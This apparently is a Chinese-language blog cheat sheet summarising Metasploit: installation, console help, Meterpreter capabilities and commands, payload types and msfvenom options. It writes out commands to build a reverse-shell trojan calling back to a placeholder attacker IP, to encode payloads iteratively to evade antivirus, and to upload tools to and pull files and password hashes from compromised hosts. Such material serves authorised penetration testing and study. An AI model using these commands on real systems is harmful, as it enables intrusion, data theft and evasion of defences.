---
title: metasploit使用总结
tags: 安全
---

[toc]

# 安装

## [官网地址](https://www.metasploit.com/)

## 版本

Metasploit的四个版本：

**Pro**：适用于渗透测试人员和IT安全团队

**Express**：适用于一般IT人员

**Community**：适用于小公司和学生

**Framework**：适用于开发人员和安全研究人员

## Linux平台上安装

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
chmod 755 msfinstall && \
./msfinstall
```

> 详细过程参考官网

# 初始化

```bash
service postgresql start && msfdb init && msfconsole
```

> 主要是数据库初始化

# Metasploit结构

# ![meta](/home/admin233/博客/verylazycat.github.io/img/meta.png)

## 目录结构

```markdown
data目录：里面存放一些可编辑的文件，主要是给Metasploit使用
documentation目录：提供一些MSF的介绍文档等
external目录：源文件和第三方的库
lib目录：MSF框架的主要组成部分
modules目录：MSF的模块存放位置
plugins目录：存放Metasploit的插件
scripts目录：存放Meterpreter代码（shell code）或者是其他的脚本文件
tools目录：各种各样实用的命令行工具
```

# HELP

```bash
Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    exit          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_status         Show the current data service status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)
### Examples
Terminate the first sessions:
    sessions -k 1
Stop some extra running jobs:
    jobs -k 2-6,7,8,11..15
Check a set of IP addresses:
    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
Target a set of IPv6 hosts:
    set RHOSTS fe80::3990:0000/110, ::1-::f0f0
Target a block from a resolved domain name:
    set RHOSTS www.example.test/24
```

# Meterpreter

## 介绍

 Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。

 最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。

 需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况

## 常用的反弹类型

### reverse_tcp

这是一个基于TCP的反向链接反弹shell, 使用起来很稳定

使用下列命令生成一个Linux下反弹shell木马：

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=你的IP lport=监听端口  -f elf -o shell
```

> 关于生成木马后续再提

然后我们打开Metasploit，使用模块handler，设置payload，注意：这里设置的payload要和我们生成木马所使用的payload一样,配置好参数就可以开始监听,当目标运行木马们就可以反弹shell了

### reverse_http

基于http方式的反向连接，在网速慢的情况下不稳定

### bind_tcp

这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST

## Payload

Metasploit中的Payload模块主要有以下三种类型：

-Single

-Stager

-Stage

Single是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似[netcat](https://en.wikipedia.org/wiki/Netcat)这样的非metasploit处理工具所捕捉到。

Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stagers Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信。

Stage是Stager Payload下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制

## Meterpreter的常用命令

```bash
help# 查看Meterpreter帮助
background#返回，把meterpreter后台挂起
bgkill# 杀死一个背景 meterpreter 脚本
bglist#提供所有正在运行的后台脚本的列表
bgrun#作为一个后台线程运行脚本
channel#显示活动频道
sessions -i number # 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用
sesssions -k  number #与会话进行交互
close# 关闭通道
exit# 终止 meterpreter 会话
quit# 终止 meterpreter 会话
interact id #切换进一个信道
run#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等
irb# 进入 Ruby 脚本模式
read# 从通道读取数据
write# 将数据写入到一个通道
run和bgrun# 前台和后台执行以后它选定的 meterpreter 脚本
use# 加载 meterpreter 的扩展
load/use#加载模块

Resource#执行一个已有的rc脚本

2.文件系统命令

cat c:\boot.ini#查看文件内容,文件必须存在

del c:\boot.ini #删除指定的文件

upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload  setup.exe C:\\windows\\system32\

download nimeia.txt /root/Desktop/   # 下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\"ProgramFiles"\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/

edit c:\boot.ini  # 编辑文件

getlwd#打印本地目录

getwd#打印工作目录

lcd#更改本地目录

ls#列出在当前目录中的文件列表

lpwd#打印本地目录

pwd#输出工作目录

cd c:\\ #进入目录文件下

rm file #删除文件

mkdir dier #在受害者系统上的创建目录

rmdir#受害者系统上删除目录

dir#列出目标主机的文件和文件夹信息

mv#修改目标主机上的文件名

search -d d:\\www -f web.config #search 文件，如search  -d c:\\  -f*.doc

meterpreter > search -f autoexec.bat  #搜索文件

meterpreter > search -f sea*.bat c:\\xamp\\

enumdesktops     #用户登录数
```

# msfvenom

> 木马生成工具

## HELP

```bash
Options:
-p, --payload    <payload>       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&#039;-&#039;或者stdin指定
-l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
-n, --nopsled    <length>        为payload预先指定一个NOP滑动长度
-f, --format     <format>        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
-e, --encoder    [encoder]       指定需要使用的encoder（编码器）
-a, --arch       <architecture>  指定payload的目标架构
--platform   <platform>      指定payload的目标平台
-s, --space      <length>        设定有效攻击荷载的最大长度
-b, --bad-chars  <list>          设定规避字符集，比如: &#039;\x00\xff&#039;
-i, --iterations <count>         指定payload的编码次数
-c, --add-code   <path>          指定一个附加的win32 shellcode文件
-x, --template   <path>          指定一个自定义的可执行文件作为模板
-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
--payload-options            列举payload的标准选项
-o, --out   <path>               保存payload
-v, --var-name <name>            指定一个自定义的变量，以确定输出格式
--shellest                   最小化生成payload
-h, --help                       查看帮助选项
--help-formats               查看msf支持的输出格式列表
```

## **生成payload**

生成payload，有有两个必须的选项：-p -f 

使用-p 来指定要使用的payload

可以使用下面的命令来查看所有msf可用的payload列表

```bash
./msfvenom -l payloads
```

-p选项也支持使用使用自定义的payload，需要使用 "-"，比如:

```bash
cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
```

使用-f 来指定payload的输出格式

使用下面的命令，可以产看msf支持的输出格式

```bash
./msfvenom --help-formats
```

## **payload编码**

如果你使用了-b选项（设定了规避字符集），会自动调用编码器

其他情况下，你需要使用-e选项来使用编码模块，例如

```bash
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
```

可以使用下面的命令，来查看可用的编码器

```bash
./msfvenom -l encoders
```

你也可以使用-i选项进行多次编码。某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的AV规避方案

可以使用下面的命令来进行迭代编码

```bash
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
```

## **规避字符**

使用-b选项意味着在生成payload的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对payload进行编码，比如

```bash
./msfvenom -p windows/meterpreter/bind_tcp -b &#039;\x00&#039; -f raw
```